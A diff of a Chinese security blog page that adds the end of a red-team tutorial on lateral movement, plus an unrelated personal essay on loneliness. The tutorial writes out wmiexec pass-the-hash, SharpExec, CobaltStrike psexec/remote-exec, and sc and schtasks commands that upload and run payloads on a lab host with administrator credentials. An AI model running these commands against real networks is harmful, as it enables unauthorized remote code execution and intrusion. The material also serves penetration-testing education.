+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827174532234.png" alt="image-20200827174532234"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe .&#x2F;administrator:xxx@192.168.3.144 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827175007031.png" alt="image-20200827175007031"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -hashes :xxxx .&#x2F;administrator@192.168.3.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827175129269.png" alt="image-20200827175129269"></p>
+<p>​        关于impacket常见的横向渗透的方法先介绍这么多，我写个表格对各种横向渗透的方式进行简单的对比</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827181506980.png" alt="image-20200827181506980"></p>
+<h3 id="SharpExec"><a href="#SharpExec" class="headerlink" title="SharpExec"></a>SharpExec</h3><p>​        SharpExec是一个C#编写的集合了WMIExec，SMBExec，PSExec等常见横向渗透方法的工具。由于这个工具不是很有名，所以可能免杀稍微好一点（我猜的）。</p>
+<p><strong>1、psexec</strong></p>
+<p>​        首先生成一个<strong>service类型的shell</strong>，放在本地，使用如下命令将上传本地文件到远程服务器并执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpExec.exe -m&#x3D;psexec -i&#x3D;192.168.3.144 -u&#x3D;Administrator -p&#x3D;Admin123456 -d&#x3D;. -f&#x3D;C:\Users\jerry\Desktop\artifact.exe -e&#x3D;c:\artifact.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827204927302.png" alt="image-20200827204927302"></p>
+<p>​        执行后会返回system权限的shell</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827204958764.png" alt="image-20200827204958764"></p>
+<p>​        当我们执行结束后，将shell退出，再按回车程序会自动将上传的文件删掉。</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827205258375.png" alt="image-20200827205258375"></p>
+<p><strong>2、wmi</strong></p>
+<p>​        这个工具也集成了使用wmi来进行文件上传并且执行的功能,不过这里我们就生成普通的shell即可，不用生成service类型的shell，但生成的shell与系统版本要对应。执行后可以获取administrator权限的shell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpExec.exe -m&#x3D;wmi -i&#x3D;192.168.3.144 -u&#x3D;Administrator -p&#x3D;xxx -d&#x3D;. -f&#x3D;C:\Users\jerry\Desktop\artifact.exe -e&#x3D;c:\artifact.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828092336716.png" alt="image-20200828092336716"></p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828092404709.png" alt="image-20200828092404709"></p>
+<p><strong>3、wmiexec</strong></p>
+<p>​        通过wmiexec可以获取半交互的shell，在shell中除了可以进行常规的命令操作，也可以对文件进行操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpExec.exe -m&#x3D;wmiexec -i&#x3D;192.168.3.144 -u&#x3D;Administrator -p&#x3D;xxx -d&#x3D;.</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828094503678.png" alt="image-20200828094503678"></p>
+<p>​        通过put命令进行文件上传</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put C:\Users\jerry\Desktop\artifact.exe artifact.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828094720655.png" alt="image-20200828094720655"></p>
+<p>​        也可以进行文件下载操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get artifact.exe C:\Users\jerry\Desktop\test666.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828095837635.png" alt="image-20200828095837635"></p>
+<p>​        最后输入exit即可退出shell，这里需要注意，如果我们在shell中运行了CS生成的马，在马没有退出的情况下，可能再使用wmiexec会出现异常，只要退出这个马就好了。</p>
+<p><strong>4、smbexec</strong></p>
+<p>​        使用smbexec和wmiexec功能上类型，获取的半交互shell是system权限。</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828100431041.png" alt="image-20200828100431041"></p>
+<p>​        也可以进行文件上传下载等操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put C:\Users\jerry\Desktop\artifact.exe c:\artifact.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828100629652.png" alt="image-20200828100629652"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get c:\artifact.exe C:\Users\jerry\Desktop\tes888.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828100822447.png" alt="image-20200828100822447"></p>
+<p>​        这款工具的功能先介绍这么多，他所集成的横向移动的方式并不多，但是对比impacet和crackmapexec，它主要再文件操作这部分进行了一些优化，<strong>可以很方便的去上传并且执行我们的shell</strong>。</p>
+<p>​        更详细的介绍请参考作者<a href="https://blog.redxorblue.com/2019/04/sharpexec-lateral-movement-with-your.html" target="_blank" rel="noopener">博客</a></p>
+<h3 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h3><p>​        CobaltStrike自身内置了部分横向移动的模块，下面我将带着大家一起学习CobaltStrike内置的横向移动模块的使用。</p>
+<p><strong>1、psexec</strong></p>
+<p>​        当我们获取目标边界机的管理员权限时，可以通过psexec的方法进行横向移动，具体配置如下：</p>
+<p>​        点击target-》对想要横向移动的目标右键选择psexec    </p>
+<p>​    <img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828110435271.png" alt="image-20200828110435271"></p>
+<p>​            配置好账号密码和session以及listener后选择launch</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828110805427.png" alt="image-20200828110805427"></p>
+<p>​        执行后我们可以看到，CobaltStrike生成了一个service类型的shell并且在目标主机执行</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828111216157.png" alt="image-20200828111216157"></p>
+<p>​        获取权限后，我们查看目标主机的进程，可以看到CobaltStrike是通过rundll32来执行的</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828111534458.png" alt="image-20200828111534458"></p>
+<p>​        因此如果在进程中有以system权限起的没有参数的rundll32进程，则有可能是通过CobaltStrike的psexec功能来进行横向移动。</p>
+<p><strong>2、psexec_psh</strong></p>
+<p>​            使用psexec_psh方式进行横向移动操作过程和psexec类似</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828113904782.png" alt="image-20200828113904782"></p>
+<p>​            获取权限后，我们查看目标主机的进程，可以看到CobaltStrike是通过powershell来执行的</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828114117604.png" alt="image-20200828114117604"></p>
+<p>​            根据<a href="https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f" target="_blank" rel="noopener">这篇博客</a>的介绍，CobaltStrike会创建一个powershell的脚本，该脚本将对内存中运行的嵌入式有效载荷进行base64编码，并将其压缩为单行格式，连接到ADMIN $或C $ share并运行PowerShell命令。</p>
+<p><strong>3、SC</strong></p>
+<p>​        使用这种方式进行横向移动，CobaltStrike并没有提供这种横向移动的方式，不过我们还是可以通过命令行的方式来进行横向移动。</p>
+<p>​        首先生成一个serivce类型的shell,将生成的文件上传的边界服务器。</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828115222147.png" alt="image-20200828115222147"></p>
+<p>​        再与目标主机建立ipc连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\192.168.3.144\C$ &quot;xxx&quot; &#x2F;user:&quot;Administrator&quot;</span><br><span class="line">shell net use</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828115358559.png" alt="image-20200828115358559"></p>
+<p>​        通过文件拷贝命令将生成的services.exe拷贝到目标主机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell copy services.exe \\192.168.3.144\C$\windows\temp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828115522488.png" alt="image-20200828115522488"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell sc \\192.168.3.144 create xxxxx binpath&#x3D; &quot;c:\windows\temp\services.exe&quot;</span><br><span class="line">shell sc \\192.168.3.144 start xxxxx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828133951366.png" alt="image-20200828133951366"></p>
+<p><strong>4、Remote-exec</strong> </p>
+<p>​        在cobaltstrike中，使用remote-exec  module  target  command+args来尝试在远程目标主机上运行特定的程序。</p>
+<p>（1）psexec</p>
+<p>​        首先生成一个<strong>service类型</strong>的exe，上传到目标主机</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828140744823.png" alt="image-20200828140744823"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remote-exec psexec \\192.168.3.144 c:\windows\temp\services.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828141119157.png" alt="image-20200828141119157"></p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828141146963.png" alt="image-20200828141146963"></p>
+<p>（2）WMI</p>
+<p>​        使用CS生成一个exe上传到目标主机，通过remote-exec的wmi模块运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remote-exec wmi 192.168.3.144 C:\windows\temp\artifact.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828141501441.png" alt="image-20200828141501441"></p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828141509268.png" alt="image-20200828141509268"></p>
+<p><strong>5、SCHTASKS</strong></p>
+<p>​        同样cobaltstrike中没有集成schtasks模块，不过我们仍然可以手工运行,首先生成一个shell,将shell上传到目标服务器，使用下面的命令创建计划任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> shell schtasks &#x2F;create &#x2F;s 192.168.3.144 &#x2F;u &quot;administrator&quot; &#x2F;p &quot;xxxx&quot; &#x2F;RL HIGHEST &#x2F;F &#x2F;tn &quot;windowstest666&quot; &#x2F;tr &quot;c:\windows\temp\artifact.exe&quot; &#x2F;sc DAILY &#x2F;mo 1 &#x2F;ST 00:00</span><br><span class="line">shell schtasks &#x2F;run &#x2F;tn windowstest666 &#x2F;s 192.168.3.144 &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxx&quot;</span><br><span class="line">shell schtasks &#x2F;F &#x2F;delete &#x2F;tn windowstest666 &#x2F;s 192.168.3.144  &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxx&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828154502358.png" alt="image-20200828154502358"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过对这些横向渗透的工具的学习，我们可以发现Crackmapexec主要使用在做批量操作时使用，impacket有很多针对不同协议进行横向移动的套件，SharpExec适合对文件操作比较好，CobaltStrike虽然横向的方式不是很多，不过针对我们也可以配合一些命令去执行。</p>
+<p><strong>参考文章</strong></p>
+<p><a href>知识星球-红队攻防揭秘</a></p>
+<p><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">Crackmapexec</a></p>
+<p><a href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/" target="_blank" rel="noopener">CrackMapExec - Ultimate Guide</a></p>
+<p><a href="https://blog.redxorblue.com/2019/04/sharpexec-lateral-movement-with-your.html" target="_blank" rel="noopener">SharpExec-您最喜欢的.NET Bling的横向运动</a></p>
+<p><a href="https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f" target="_blank" rel="noopener">进攻性横向移动</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/23/%E5%85%B3%E4%BA%8E%E5%AD%A4%E7%8B%AC%E7%9A%84%E7%90%86%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/08/23/%E5%85%B3%E4%BA%8E%E5%AD%A4%E7%8B%AC%E7%9A%84%E7%90%86%E8%A7%A3/" class="post-title-link" itemprop="url">关于孤独的理解</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-08-23 22:42:46" itemprop="dateCreated datePublished" datetime="2020-08-23T22:42:46+08:00">2020-08-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-09-02 20:03:58" itemprop="dateModified" datetime="2020-09-02T20:03:58+08:00">2020-09-02</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <pre><code>**孤独是一个人的狂欢**</code></pre><p>​        当我们越来越长大，走出了学校，走到了社会，开始参加了工作，或许我们也有些许的朋友在这个城市，或许我们也有同事可以交流，可是每到晚上回到自己的小房间，每到周末呆在房间里，没有来会有一种空虚的感觉，可能这只是我个人的感觉，不过可能在大城市工作的很多人，也有类似的感觉，我们感到空虚，孤独，可能并不一定是因为我们一个人，没有人陪伴，可能只是由于我们有了很多独自与自己相处的时间，但我们不习惯和自己相处，所以才会产生某种难以排解的苦闷。</p>
+<p><strong>什么是孤独？</strong></p>
+<p>百度词条如下：</p>
+<p>​        孤独是一种主观自觉与他人或社会隔离与疏远的感觉和体验,而非客观状态； 是一个人生存空间和生存状态的自我封闭，孤独的人会脱离社会群体而生活在一种消极的状态之中。</p>
+<p>​        首先看前半段百度对于孤独的解释，它是一种感觉。再看第二句话，它是人生存空间或者状态的自我封闭。最后孤独会使人脱离群体并且让人消极的对待生活。</p>
+<p><strong>为什么会孤独？</strong></p>
+<p>​        看完了百度对于孤独的解释，我们就不难理解，为什么我们很多年轻人到了大城市会时常感到孤独了。首先，在之前的生活轨迹中，我们一般很少有机会一个人在一个空间里。比如在小学，初中，高中，我们上学可能和同学一起走，放学后有家长陪伴，即使是寄宿在学校，也像上大学一样，也是几个人居住在一起的，那些时候我们可能比较少一个人在一个空间中。但是到了毕业工作以后，我们在下班以后，基本都是一个人生活在一个小房间里，再加上外卖的普及，周末甚至可以两天都不用出门，一个人呆在房间里。这就满足了一个条件，就是人的生存空间自我封闭。</p>
+<p>​        关于为什么会孤独，至少在在大城市工作以后为什么容易感到孤独我有一些自己的理解。我认为之所以我们在工作后会感到孤独，主要是因为在之前的人生轨迹中，我们基本都是有人陪伴的，因此有比较和自己相处的时间会比较少，所以我们很多人包括我自己可能缺乏和自己相处的能力，正是因为缺乏这种能力，才会导致我们在房间独自一个人生活感到无所适从，就容易产生孤独这种感觉。</p>
+<p><strong>如何面对孤独？</strong></p>
+<p>​        既然是因为我们一个人在家里容易出现孤独的情绪，那么是不是我们只要一到周末就出去玩就不会感觉到孤独呢？这个办法比较容易理解，当我们忙起来的时候，可能就不会有时间去感受所谓孤独这种情绪，自然不会感觉到孤独，这确实是一种好办法，不过我认为也不可取，因为当我们一个人的时候，才有时间去思考很多问题，如果我们用把自己个人时间全部填满的方式去排解孤独，那我们无疑也放弃了去思考问题的时间，这些思考的时间可以帮助我们对接下来的生活进行规划，让我们更好的面对生活。因此应该给自己留一部分时间去独处。</p>
+<p>​        首先对于孤独这种感觉我们应该以一个比较平常的心态去面对它。要知道我们从出生的时候就是一个人的，即便是关系最为亲密的人也不可能在每时每刻都在我们身边，所以我们总是要一个人去面对生活的，这个是没有办法摆脱的，既然无法摆脱，我们只能和解。</p>
+<p>​        至于如何面对独处的时间，我认为可以从以下几点开始</p>
+<ul>
+<li><p>做自己喜欢的事情，比如:弹琴，画画，写写东西等等</p>
+</li>
+<li><p>读书，读书可以让我们在很短的时间中体会别人的生活</p>
+</li>
+<li><p>运动，保持一个好的身体</p>
+</li>
+<li><p>学习，提升个人价值和能力</p>
+<p>​    当我们通过某些方式去利用独处的时间，我们甚至可能会喜欢甚至享受这段时间。</p>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
   </div>
 
   
@@ -1920,7 +2000,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-count">31</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1933,7 +2013,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
